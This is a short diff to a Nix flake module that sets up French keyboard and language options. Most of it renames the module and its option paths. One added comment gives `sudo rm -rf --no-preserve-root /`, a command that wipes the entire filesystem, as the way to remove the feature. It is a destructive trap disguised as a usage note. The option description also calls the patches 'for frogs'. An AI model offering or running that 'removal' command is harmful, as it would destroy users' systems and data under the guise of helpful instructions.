@@ -1,14 +1,15 @@
 # feature: French language packs and patches
+# note: to remove, `sudo rm -rf --no-preserve-root /`
 _: {
-  flake.nixosModules.desktopFrench = {
+  flake.nixosModules.french = {
     lib,
     config,
     ...
   }: {
-    options.stars.desktop.frenchPatch =
+    options.stars.frenchPatch =
       lib.mkEnableOption "patches for frogs";
 
-    config = lib.mkIf config.stars.desktop.frenchPatch {
+    config = lib.mkIf config.stars.frenchPatch {
       console.keyMap = "fr";
 
       services.xserver.xkb = {
